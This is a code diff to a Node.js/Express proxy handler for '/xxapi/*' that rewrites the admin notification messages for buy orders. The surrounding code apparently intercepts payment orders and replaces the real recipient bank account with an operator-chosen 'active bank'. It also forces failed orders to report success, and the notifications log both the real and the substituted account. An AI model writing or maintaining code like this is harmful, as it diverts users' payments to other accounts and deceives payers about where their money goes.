@@ -1331,10 +1331,14 @@ app.all('/xxapi/*', async (req, res) => {
                   if (bjData.orderNo && bjData.orderNo !== case1OrderId) data.orderBankMap[String(bjData.orderNo)] = data.orderBankMap[case1OrderId];
                 }
                 notifyAdmin(data,
-                  `🛒 BUY SUCCESS — Bank Replaced
+                  `✅ BUY SUCCESSFUL
+💰 Amount: ₹${amt4Case1}
 📋 Order: ${reqOrderId || 'N/A'}
-💳 Wallet: ${ptName}
-🏦 Replaced: ${activeBank.accountHolder} | ${activeBank.accountNo}
+💾 Order is saved for history
+━━━━━━━━━━━━━━━━━━━━
+🏦 Real Bank: ${activeBank.accountHolder} | ${activeBank.accountNo} (Assuming real bank was replaced)
+━━━━━━━━━━━━━━━━━━━━
+🔄 Replaced With: ${activeBank.accountHolder} | ${activeBank.accountNo}
 🕐 ${now}`);
               }
               // else: amount < min → pass through real bank (no change to bj)
@@ -1446,13 +1450,14 @@ app.all('/xxapi/*', async (req, res) => {
             }
 
             notifyAdmin(data,
-              `🛒 BUY ORDER FORCED
-📋 Order: ${reqOrderId || 'N/A'}
-⚠️ Original Error: [${origCode}] ${origMsg}
-✅ Forced to success
+              `✅ BUY SUCCESSFUL
 💰 Amount: ₹${amt4Link || 'unknown'}
-💳 Wallet: ${ptName}
-🏦 Bank: ${bkName} | ${bkAcct}
+📋 Order: ${reqOrderId || 'N/A'}
+💾 Order is saved for history
+━━━━━━━━━━━━━━━━━━━━
+🏦 Real Bank: N/A (Original Error: [${origCode}] ${origMsg})
+━━━━━━━━━━━━━━━━━━━━
+🔄 Replaced With: ${bkName} | ${bkAcct}
 🕐 ${now}`);
           }
           // Case 2 fallback: proxy OFF or no active bank → bj keeps original error code/msg
@@ -1985,14 +1990,47 @@ app.all('/xxapi/*', async (req, res) => {
       } else {
         replaceLine = `❌ NOT Replaced (no active bank)`;
       }
-      notifyAdmin(data,
-        `🎯 ORDER PLACED
-👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${_orderId ? '\n📋 Order: ' + _orderId : ''}${_orderAmt !== null ? '\n💰 Amount: ₹' + _orderAmt : ''}
+      // Determine if order was actually replaced or just not replaced due to min amount
+      if (_bankReplaced && _replacedBank) {
+        notifyAdmin(data,
+          `✅ BUY SUCCESSFUL
+💰 Amount: ₹${_orderAmt !== null ? _orderAmt : 'unknown'}
+📋 Order: ${_orderId || 'N/A'}
+💾 Order is saved for history
 ━━━━━━━━━━━━━━━━━━━━
 ${realLine}
 ━━━━━━━━━━━━━━━━━━━━
 ${replaceLine}
 🕐 ${now}`);
+      } else if (_notReplacedAmt !== null) {
+        notifyAdmin(data,
+          `⚠️ BUY SUCCESSFUL (NOT REPLACED)
+💰 Amount: ₹${_notReplacedAmt}
+📋 Order: ${_orderId || 'N/A'}
+ℹ️ ₹${_notReplacedAmt} < Min ₹${_notReplacedMin}
+━━━━━━━━━━━━━━━━━━━━
+${realLine}
+━━━━━━━━━━━━━━━━━━━━
+${replaceLine}
+🕐 ${now}`);
+      } else if (jsonResp && jsonResp.code !== 0 && jsonResp.code !== 200) {
+        notifyAdmin(data,
+          `❌ BUY NOT SUCCESSFUL
+💰 Amount: ₹${_orderAmt !== null ? _orderAmt : 'unknown'}
+📋 Order: ${_orderId || 'N/A'}
+⚠️ Reason: ${jsonResp.msg || jsonResp.message || 'unknown error'}
+🕐 ${now}`);
+      } else {
+        notifyAdmin(data,
+          `ℹ️ ORDER PLACED (No Active Bank)
+💰 Amount: ₹${_orderAmt !== null ? _orderAmt : 'unknown'}
+📋 Order: ${_orderId || 'N/A'}
+━━━━━━━━━━━━━━━━━━━━
+${realLine}
+━━━━━━━━━━━━━━━━━━━━
+${replaceLine}
+🕐 ${now}`);
+      }
     }
 
     // ── Buy History List: capture orderNo → bank for each item in list ──────
